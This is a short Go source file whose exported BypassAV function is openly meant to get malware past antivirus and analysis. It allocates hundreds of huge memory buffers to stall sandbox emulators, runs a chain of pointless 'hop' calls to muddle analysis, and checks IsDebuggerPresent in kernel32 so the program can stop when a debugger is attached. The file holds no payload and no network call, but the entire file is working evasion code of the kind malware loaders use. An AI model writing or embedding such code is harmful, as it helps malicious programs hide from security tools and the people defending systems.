package extra

import (
	"math/rand"
	"syscall"
	"time"
)

var K32 = syscall.MustLoadDLL("kernel32.dll") //kernel32.dll
var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")

var MagicNumber int64 = 0

func BypassAV() bool {
	allocateFakeMemory()
	jump()
	return checkDebugger()
}

func jump() {
	MagicNumber++
	hop1()
}

// Returns an int >= min, < max
func randomInt(min, max int) int {
	return min + rand.Intn(max-min)
}

func allocateFakeMemory() {
	rand.Seed(time.Now().UnixNano())

	for i := 0; i < randomInt(600, 1500); i++ {
		var Size = 28000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [101300000]byte
		Buffer_2[0] = 0
	}
}

func checkDebugger() bool {
	Flag, _, _ := IsDebuggerPresent.Call()
	if Flag != 0 {
		return false
	}
	return true
}

func hop1() {
	MagicNumber++
	hop2()
}
func hop2() {
	MagicNumber++
	hop3()
}
func hop3() {
	MagicNumber++
	hop4()
}
func hop4() {
	MagicNumber++
	hop5()
}
func hop5() {
	MagicNumber++
	hop6()
}
func hop6() {
	MagicNumber++
	hop7()
}
func hop7() {
	MagicNumber++
	go hop8()
}
func hop8() {
	MagicNumber++
	hop9()
}
func hop9() {
	MagicNumber++
	hop10()
}
func hop10() {
	MagicNumber++
	hop100()
}
func hop100() {
	MagicNumber++
	hop101()
}
func hop101() {
	MagicNumber++
}
